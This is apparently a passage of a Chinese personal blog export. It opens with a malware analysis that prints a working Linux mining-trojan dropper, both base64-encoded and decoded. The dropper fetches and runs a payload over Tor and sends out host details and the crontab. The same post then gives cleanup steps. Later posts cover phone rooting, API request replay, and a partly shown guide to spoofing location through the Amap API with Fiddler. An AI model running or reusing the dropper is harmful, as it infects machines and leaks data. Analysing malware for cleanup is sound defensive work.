mVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash 解码之后： 12345678910111213141516171819202122232425262728293031323334353637nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVexec &amp;&gt;/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo &quot;curl -4fsSLkA- -m200&quot;)t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)sockz() &#123;n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)&#125;fexe() &#123;for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done&#125;u() &#123;sockzf=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x&#125;for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su doif ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; thenfexe;u $t.$hls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)elsebreakfidone 好家伙，不看不知道，一看下一跳，跟之前那个文件一模一样，吓得我又不由自主的说了一句，好家伙 这里补充一点分析：之前我们只是用crontab -l，查看了定时任务，并没有找到定时任务的配置文件，而经验告诉我们，crontab的配置文件，通常在/etc/cron.d/下，还有，如果是root用户，在/var/spool/cron/crontabs/root文件中，于是我们分别执行 12ls -la /etc/cron.d/cat /var/spool/cron/crontabs/root 果然，看到了熟悉的0systemd-service 我们来看一下，它的内容，执行 1cat /etc/cron.d/0systemd-service 可以清晰的看到，它在定时的启动挖矿程序 好了，分析真的就到这里为止了，下面是解决木马篇 彻底干掉木马分析了一大堆，最关键的文件是： 1234/etc/cron.d/0systemd-service/var/spool/cron/crontabs/root/opt/systemd-service.sh/root/.systemd-service.sh 删掉这几个文件，然后停掉挖矿进程即可 1cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root 重启，验证 1reboot now 后续根据经验，我们可以知道，挖矿木马，通常还会修改我们的know_hosts文件和hosts文件，所以我们去验证一下，执行 1cat .ssh/known_hosts 可以看到，果然写了一个公钥到know_hosts文件 可以执行，echo &gt; .ssh/known_hosts，修复它 我们在看一下hosts文件，执行 1cat /etc/hosts 看起来并没有修改 当然，也可以利用木马的特征，故意的制造一些混淆文件，防止再次感染，当然，也不是绝对有效的，安全与反安全，从来就没有高低之分，有的只是技术人员的能力差别而已 附上防止再次感染的命令 1234mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root 总结：解决挖矿木马，并防止感染，只需要两步： 1cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root 1234mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root 本文完。。。看到这里，也说明你很有毅力和探索欲，如果觉得我写的还不错，请打赏支持我，毕竟创作不易，谢谢大家]]></content>
      <categories>
        <category>linux</category>
        <category>ubantu</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>挖矿木马</tag>
        <tag>服务器</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终端使用代理]]></title>
    <url>%2Fposts%2F39ffeca3%2F</url>
    <content type="text"><![CDATA[临时windows终端 1set all_proxy=socks5://host:port linux终端 1export all_proxy=socks5://host:port 永久写入配置文件中即可]]></content>
      <categories>
        <category>爬虫</category>
        <category>代理</category>
      </categories>
      <tags>
        <tag>终端</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小米6钉子户折腾日记（一）]]></title>
    <url>%2Fposts%2F574b2b2e%2F</url>
    <content type="text"><![CDATA[篇一：初级折腾 前言 先谈一谈我和小米的缘分吧，自从14年，我购入了属于我自己的第一台小米手机——小米note之后，就一直在用小米系列的手机产品，我用过的产品线大概是这样的小米note-&gt;小米5-&gt;小米max-&gt;小米6-&gt;小米CC9（目前），至于我为什么要买小米系的产品，我认为原因有两点吧，第一，miui确实大而全并且好玩，发烧友们应该都懂；第二，我应该算是雷军的粉丝吧，国内科技圈我最为崇拜的两个人，雷军和求伯君 再谈一谈，我手里这台小米6吧，17年首发提前批F码通道到手的，说实话，我自己也没想到，它坚持到了现在，并且目前还保持着较高的流畅度，因为一直保护的还算比较好，成色比较新（至少85新吧，仅不锈钢中框掉了一点点漆），截止到目前为止，没有换过手机的任何零部件，我都用它干过些什么呢？老实说，在它作为我的主力机的时候，我并没有对它进行任何的折腾，就纯粹的正常使用，我对它的折腾开始于，它作为备用机的时候，作为一个发烧友（可能不太合格） 折腾 当然包括但不限于解锁，刷机，root，recovery，magisk，xposed，魔改官方ROM，魔改官方apk等操作 实际上，就我个人而言，折腾应该算作是我的兴趣爱好吧，生命在于折腾 说明主要回答下面这几个问题： 这个系列的文章仅适用于小米6钉子户吗？答：我在这个系列的文章中仅会以小米6手机举例：包括所有实例，步骤等。但是折腾这东西吧，思路其实是适用于很多方面，只要你有一颗想做极客的心，我认为都可以从这个系列的文章中学到一些东西 这篇文章的内容包括哪些？答：大概有： 解锁bl 刷第三方recovery 刷入root 刷入magisk 刷入xposed 初级救砖 为什么这篇文章是初级篇？答：因为我认为以上所列出的所有操作，均是初级操作，换言之，就是大部分人都会的东西（毕竟各路教程满天飞），没什么好稀奇的，也谈不上很牛的技术，如果非要说牛的话，我认为，造轮子的大佬们牛，努力吧，也许这辈子都无法到达那个高度，但至少我们曾经为此努力过，不是吗？ 后面会有高级篇吗？答：这是系列文章，后面自然会出高级篇（提前给自己挖坑。不知道啥时候埋） 高级篇的内容包括哪些？答：大概有 反编译，魔改系统apk 魔改ROM 移植ROM 高级救砖 各种自定义 开始请严格按照目录依次操作 解锁bl就参考官方吧，很多时候官方的东西，会给我们很多的灵感，遇到问题的时候，多翻一翻官方的东西，也许有意外惊喜，至于解锁教程，官方的教程已经足够详细，不再多说，如果实在不会，请访问官方教程 刷第三方recovery提到第三方recovery就不得不提twrp，虽然我最后使用的第三方recovery不是twrp，而是OrangeFox，但是刷入OrangeFox前，需要先刷入其他的第三方recovery，于是还是得刷twrp 需要准备的工具： adb fastboot 一条数据线 如果你电脑上有Android Sdk，你会发现这些都是集成好的，为了方便使用，你需要做的大概只有把那个目录加入到环境变量中 需要准备的文件： twrp-3.5.0_9-0-sagit.imgOrangeFox-sagit-stable@R10.0.zip 步骤 手机设置中打开开发者选项，打开USB调试和USB调试安全选项，如果你手机没有开发者选项这个设置，快速连续点击设置-&gt;我的设备-&gt;全部参数-&gt;miui版本十次 手机开机状态下，数据线连上电脑，执行命令adb reboot bootloader或者手机关机状态下，同时按住开机键和音量上键，进入fastboot，看到米兔正在修理机器人界面 在你下载好的文件目录下，打开cmd，执行命令，fastboot flash recovery twrp-3.5.0_9-0-sagit.img 刷完之后，不要直接开机，不然会自动恢复官方的recovery，保持关机状态下，同时按住开机键和音量上键，应该会进入twrp的recovery 如果你有密码，进入recovery后会要求输入密码，验证通过后这时候adb会自动连接上，把OrangeFox的zip复制到手机上，然后使用twrp的install功能，安装zip 完成后重启，第三方recovery就刷好了 one the more，如果你不喜欢英文，可以在设置中切换为中文 这里稍微提一下为啥要使用OrangeFox的recovery，因为这家的recovery对miui官方包的支持可能是最好的吧，它支持官方包的ota等，我个人比较喜欢官方包，在官方包的基础上魔改一些东西，自定义 刷入root这个相当的简单了，如果你喜欢官方给你的root，你可以选择刷入miui官方的开发版系统自带的root包，这个过程可以自动完成，只需要在手机管家-&gt;应用管理-&gt;权限-&gt;开启root权限即可，如果你不喜欢官方给你的，刷入magisk是另一种选择 刷入magisk直接下载最新的Magisk.zip，然后放入手机根目录，重启到recovery，安装即可 刷入xposed官方的xposed最高只支持到android 8，如果你是8及其以下，可以选择官方的，不是的话，就选择Edxposed吧 需要准备的文件： 步骤 进入recovery，刷入magisk 开机，在magisk manager应用中安装Riru模块，可能需要一个梯子 进入recovery，刷入Edxposed 开机，安装Edxposed Manager enjoy it!!! 初级救砖其实就是卡刷和线刷救砖，预备好官方包，在无限重启 无法开机等异常状态时，重新刷入官方包，使之回归到正常状态，不再过多赘述 我预备了这四个包，既有卡刷包，也有线刷包 总结初级篇所有过程均不复杂，毕竟工具确实好用，按步骤来基本不会出问题 题外话，不建议使用未知来源或者不开源的magisk或者xposed模块，so dangerous 其实这篇文章里面所有内容，均有人做好了相关的ROM了甚至他们给的功能增强更强，而安装基本也就是一键操作，很方便，那为什么我不直接使用他们做好的呢？答案其实很显然：推广太多并且极度危险，另外 我喜欢自己魔改，包括在写这篇文章中所安装好magisk和xposed，它们很好玩，很强，但其实我不需要他们，为什么呢？因为他们给的太多了，而我需要的并没有这么多，由此将会引出高级篇，各种自定义修改，魔改系统等等 只有你自己才知道你需要的到底是什么，但好多时候 其实连你自己都不知道 敬请期待高级篇]]></content>
      <categories>
        <category>发烧友折腾日记</category>
      </categories>
      <tags>
        <tag>小米6</tag>
        <tag>钉子户</tag>
        <tag>折腾</tag>
        <tag>解锁bl</tag>
        <tag>刷recovery</tag>
        <tag>极客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于油猴的力扣题目转换工具 html转markdown 便于写题解]]></title>
    <url>%2Fposts%2Ff027b6b4%2F</url>
    <content type="text"><![CDATA[描述刷力扣的时候，写题解是好习惯，但是每次复制题目，都需要手动修改成markdown格式的，挺麻烦的，于是借助油猴脚本插件，写了这个力扣题目转换工具，功能是将html格式的题目，转换成markdown格式的题目，一键复制粘贴即可很愉快的去写题解了 使用 首先在浏览器安装油猴插件 然后从 https://gitee.com/zimolove3/leetcode-helper/raw/main/leetcode-helper.user.js 导入油猴脚本 打开力扣题目，你会发现加载了脚本，选择图中所示复制题目到剪切板即可 复制成功 源代码开源地址：https://github.com/ZimoLoveShuang/leetcode-helper]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>油猴脚本</tag>
        <tag>力扣</tag>
        <tag>html</tag>
        <tag>markdown</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一种导入小爱课程表的非一般方法]]></title>
    <url>%2Fposts%2Fbf2ec5ab%2F</url>
    <content type="text"><![CDATA[本文原理性说明略多，如不想看，那么下面的一键直达，应该适合你点此一键直达 或者使用另一个开源项目 前言《小爱课程表》是小米最新推出的课程表应用。 所有使用MIUI12的小米手机都自带，它具有课程提醒和上课静音的功能，并且支持负一屏展示、日历订阅等非常实用的功能。 当然，其他手机也能用，小爱课程表应用目前已经上架了多个应用商店，包括iOS 和安卓商店，所以，只需要去应用商店搜索「小爱课程表」下载即可食用，它相比其他课程表产品的优势在于：更新及时，界面简洁无广告，设置课程便捷，可添加桌面小部件（所以负一屏展示这个功能，可能就MIUI12支持了吧，安利一下）。 下面放一些效果图： 另外，值得一提的是，小爱课程表推出了和小爱同学一起打造最好用的课程表的内测功能，号称：只需一点JS基础，几十行代码，便可参与课程表项目，体会代码落地产品的乐趣，用你的高超技艺造福同校同学！，如果你有适配的想法，请戳官方文档 如果你想适配，但苦于没有参考，想找个参考的话，可以看一下我的开源项目成都信息工程大学 小爱课程表适配 原理下面本文的重点来了，先简单介绍一下小爱课程表这个适配功能原理：小米的工程师们提供了一个webview，让开发者可以在页面上加载出你的课程表，然后通过你使用官方提供的chrome浏览器插件开发好的scheduleHtmlProvider.js和scheduleHtmlParser.js解析出符合小爱预定义好的规范的json数据，点击一键导入之后，通过https请求提交到小米的服务器，然后小爱课程表根据这个json数据进行课程表的渲染，单就原理而言，并没有什么太大的问题，但是坑就坑在Android的webview，这个无法渲染出js动态生成的课程表（目前已知金智和树维的教务系统，无法渲染出来，登陆之后会白屏，就像下面这张图一样） 博主也是在适配完了我们学校的小爱课程表之后，才发现这个问题的，这适配完了，用不了的情况，就很不舒服，于是尝试寻找解决办法 破局在理解了小爱课程表适配功能的原理之后，发现，我们缺少的其实就只有提交到小米的服务器这一步，所以从另一个角度来看，我们完全可以自己提交课程数据给小米的服务器，于是说干就干，抓个包来看看小爱课程表提交到小米的服务器的数据是什么样子的，在这里我选用的抓包工具是小黄鸟 配置小黄鸟 下载并安装小黄鸟，GitHub传送门 打开小黄鸟，安装证书等等 设置小黄鸟的目标应用为小爱同学 开始抓包 打开小爱同学，添加一条测试课程看看 发现提交课程的报文如下： 1234567891011121314151617POST /course/courseInfo h2Host: i.ai.mi.comcontent-length: 272access-control-allow-origin: trueuser-agent: Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36content-type: application/jsonaccept: */*origin: https://i.ai.mi.comx-requested-with: com.miui.voiceassistsec-fetch-site: same-originsec-fetch-mode: corssec-fetch-dest: emptyreferer: https://i.ai.mi.com/h5/precache/ai-schedule/accept-encoding: gzip, deflateaccept-language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#123;&quot;weeks&quot;:&quot;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20&quot;,&quot;name&quot;:&quot;测试&quot;,&quot;position&quot;:&quot;&quot;,&quot;teacher&quot;:&quot;&quot;,&quot;sections&quot;:&quot;2&quot;,&quot;day&quot;:1,&quot;style&quot;:&quot;&#123;\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;&#125;&quot;,&quot;csId&quot;:2371853867,&quot;userId&quot;:123436229,&quot;deviceId&quot;:&quot;a88374c981cf771f8360dabcde4c3574&quot;&#125; 分析报文接口地址：https://i.ai.mi.com/course/courseInfo接口传递的json及其字段含义： 123456789101112&#123; "weeks": "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",// 课程上课周数 "name": "测试",// 课程名称 "position": "",// 课程上课地点 "teacher": "",// 课程上课老师 "sections": "2",// 课程是第几节课 "day": 1,// 课程是周几上课 "style": "&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;",// 字体背景颜色设置 "csId": 2371853867,// 课程id，可以不提交 "userId": 123436229,// 用户id，可以在vConsole的LocalStorage中获取到，此处我的id已打码，vConsole，连续点击荣誉coder下方空白区域调出 "deviceId": "a88374c981cf771f8360dabcde4c3574"// 设备id，可以在vConsole的LocalStorage中获取到，此处我的id已打码&#125; 比较将抓取到的接口和我们按照官方文档渲染出来的json格式比较一下：可以发现，sections和weeks字段有些许的不同，另外，缺少了style，userId，deviceId字段，基于此，我们可以稍微修改一下js解析出来的格式，并且加入缺少的字段，然后模拟请求提交给小米的服务器即可 修改json格式： “weeks”:由数组改成字符串，逗号分割 “sections”:由数组改为字符串，逗号分割 增加userId，deviceId字段，值为vConsole的LocalStorage中的相关值 增加style字段，可以给默认值为&quot;{\&quot;color\&quot;:\&quot;#00A6F2\&quot;,\&quot;background\&quot;:\&quot;#E5F4FF\&quot;}&quot;，或者自定义，建议默认值，不会影响负一屏的效果，但缺点就是不够个性化 模拟请求原理写了一大堆，相信大家应该都懂了，所以这里只给出一个写好的python脚本，依赖python3，requests 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding:utf-8 -*-import requestsimport jsoncourseInfos = json.loads( '&#123;"courseInfos":[&#123;"day":1,"sections":"1,2","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4303"&#125;,&#123;"day":2,"sections":"1,2","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":2,"sections":"1,2","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":3,"sections":"1,2","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4501"&#125;,&#123;"day":4,"sections":"1,2","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H2403"&#125;,&#123;"day":5,"sections":"1,2","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":2,"sections":"3,4","name":"英语一","teacher":"李翠兰","weeks":"1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","position":"H4301"&#125;,&#123;"day":3,"sections":"3,4","name":"云计算","teacher":"王婷","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":3,"sections":"3,4","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":4,"sections":"3,4","name":"信息系统安全","teacher":"张永清","weeks":"9,10,11,12","position":"H1603"&#125;,&#123;"day":4,"sections":"3,4","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4601"&#125;,&#123;"day":1,"sections":"5,6","name":"高等工程数学","teacher":"任红萍","weeks":"1,2,3,4,5,6,7,8,9,10","position":"H4305"&#125;,&#123;"day":2,"sections":"5,6","name":"物联网技术","teacher":"沈艳","weeks":"5,6,7,8","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4501"&#125;,&#123;"day":2,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4501"&#125;,&#123;"day":3,"sections":"5,6","name":"操作系统结构","teacher":"徐虹","weeks":"1,2,3,4,5,6,7,8","position":"H4304"&#125;,&#123;"day":3,"sections":"5,6","name":"自然辩证法概论","teacher":"黄澜","weeks":"9,10,11,12,13,14,15,16,17","position":"H1301"&#125;,&#123;"day":4,"sections":"5,6","name":"现代数据库技术","teacher":"邹茂扬","weeks":"1,2,3,4","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"数字图像处理及应用","teacher":"胡金蓉","weeks":"5,6,7,8","position":"H4303"&#125;,&#123;"day":4,"sections":"5,6","name":"虚拟现实","teacher":"魏敏","weeks":"9,10,11,12","position":"H4305"&#125;,&#123;"day":1,"sections":"7,8","name":"数据挖掘","teacher":"马健兵","weeks":"9,10,11,12","position":"H4303"&#125;]&#125;')exclude = ['虚拟现实', '数字图像处理及应用', '嵌入式系统', '云计算', '物联网技术']userId = 123436229deviceId = 'a88374c981cf771f8360dabcde4c3574'# i = 2371853867for course in courseInfos['courseInfos']: if course['name'] in exclude: continue # course['csId'] = i course['userId'] = userId course['deviceId'] = deviceId course['style'] = '&#123;\"color\":\"#00A6F2\",\"background\":\"#E5F4FF\"&#125;' data = json.dumps(course, ensure_ascii=False) headers = &#123; 'Host': 'i.ai.mi.com', 'content-length': str(len(data)), 'access-control-allow-origin': 'true', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36', 'content-type': 'application/json', 'accept': '*/*', 'origin': 'https://i.ai.mi.com', 'x-requested-with': 'com.miui.voiceassist', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://i.ai.mi.com/h5/precache/ai-schedule/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', &#125; res = requests.post(url='https://i.ai.mi.com/course/courseInfo', headers=headers, data=data.encode()) print(res.text) print(data) # i += 1 使用方式可以直接使用我的这个开源项目，前提是你们学校的课程表已经适配了，不然你需要先适配 成信大学子 clone 适配小爱课程表的项目到本地 登陆教务管理系统，保存课表html 打开小爱课程表，在vConsole的LocalStorage中拿到userId和deviceId；vConsole，可以通过连续点击荣誉coder下方空白区域调出 拿到课表的table的HTML源代码放到course_table_demo.html的body中 双击course_table_demo.html，用浏览器查看，并在console中将打印出来的课表json复制出来 修改上面的python脚本的相关配置为自己的，然后运行python脚本 enjoy it 其他学校学子 适配小爱课程表 接下来就和上面一样了 致谢部分思路来自于： 导出课表到小爱课表的一种方法，支持单双周/教师教室/背景色 将超级课程表的课程一键导入至小爱课程表]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>JavaScript</tag>
        <tag>小爱课程表</tag>
        <tag>抓包</tag>
        <tag>HttpCanary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实战fiddler劫持高德地图api伪装位置]]></title>
    <url>%2Fposts%2Fe2047c6%2F</url>
    <content type="text"><![CDATA[工具及用途 fiddler抓包，分析网络流量，劫持请求和响应 一个好用的文本编辑器或者IDE，比如notepad++或者vs code nodejs或者python或者java或者其他，选一种你喜欢的编程语言来写服务器端应用 准备 先去高德地图开放平台申请一个Web端应用，得到key 然后参考文档快速的写一个简单的定位的网页，为了节约时间，我这里给出一个简单的示例demo，使用时将下面的代码保存到本地，可以命名为a.html或者其他，然后将自己申请好的key，填入源代码对应位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 id="showLocation"&gt;获取定位中。。。&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&lt;script src="https://webapi.amap.com/loader.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; AMapLoader.load(&#123; "key": "申请好的Web端开发者Key", // 申请好的Web端开发者Key，首次调用 load 时必填 "version": "1.4.15", // 指定要加载的 JSAPI 的版本，缺省时默认为 1.4.15 "plugins": [], // 需要使用的的插件列表，如比例尺'AMap.Scale'等 "AMapUI": &#123; // 是否加载 AMapUI，缺省不加载 "version": '1.1', // AMapUI 缺省 1.1 "plugins": ['overlay/SimpleMarker'], // 需要加载的 AMapUI ui插件 &#125;, "Loca": &#123; // 是否加载 Loca， 缺省不加载 "version": '1.3.2' // Loca 版本，缺省 1.3.2 &#125;, &#125;).then((AMap) =&gt; &#123; AMap.plugin('AMap.Geolocation', function () &#123; var geolocation = new AMap.Geolocation(&#123; // 是否使用高精度定位，默认：true enableHighAccuracy: true, // 定位按钮的停靠位置的偏移量，默认：Pixel(10, 20) buttonOffset: new AMap.Pixel(10, 20), // 定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false zoomToAccuracy: true, // 定位按钮的排放位置, RB表示右下 buttonPosition: 'RB' &#125;) geolocation.getCurrentPosition(function (status, result) &#123; if (status == 'complete') &#123; onComplete(result) &#125; else &#123; onError(result) &#125; &#125;); function onComplete(data) &#123; // data是具体的定位信息 console.log('定位成功') document.getElementById('showLocation').innerText = data.formattedAddress console.log(JSON.stringify(data)) &#125; function onError(data) &#123; // 定位出错 console.log('定位出错') console.log(data) &#125; &#125;) &#125;).catch((e) =&gt; &#123; console.log(e); //加载错误提示 &#125;);&lt;/script&gt; 然后双击使用浏览器打开该html文件，推荐chorme浏览器，不出意外的话（定位是个耗时操作，可能需要等一下），你应该可以看到类似下面这样的网页，没什么特别的，就是定位到了你的当前位置（小声bb：当然，我这是伪装过的） 开始配置fiddler打开fiddler，菜单栏选择Tools-&gt;Options-&gt;Connections，如下图配置就行，然后重启fiddler 抓包分析定位报文浏览器打开a.html，定位成功后查看fiddler中抓到的报文，如下： 123456789101112# 请求GET https://restapi.amap.com/v3/geocode/regeo?key=你申请的key&amp;s=rsv3&amp;language=zh_cn&amp;location=116.333374,40.009645&amp;extensions=base&amp;callback=jsonp_98368_&amp;platform=JS&amp;logversion=2.0&amp;appname=file%3A%2F%2F%2FC%3A%2FUsers%2Fzimo%2FDesktop%2Fa.html&amp;csid=45AD182B-2FF2-45B1-A74B-134A116B1242&amp;sdkversion=1.4.15 HTTP/1.1Host: restapi.amap.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36Accept: */*Sec-Fetch-Site: cross-siteSec-Fetch-Mode: no-corsSec-Fetch-Dest: scriptAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: cna=wO0GGESg9wICAd4SfkOgapRy; xlly_s=1; passport_login=MjA0ODYxODA4LGFtYXBCR1hNUkx0NmIsbWZremZ1eWVpc2Z1NWNndzNpcmhqc2ptNXp4c3JmdHosMTYwMzI5MDUzMixOMlF5TkRFME5USTJNbVExTXpBeU16Smtaab15TjJObU1EUmpORGc1T0RjPQ%3D%3D 123456789101112131415# 响应HTTP/1.1 200 OKServer: TengineDate: Thu, 22 Oct 2020 03:14:11 GMTContent-Type: application/json;charset=utf-8Connection: closeContent-Length: 702gsid: 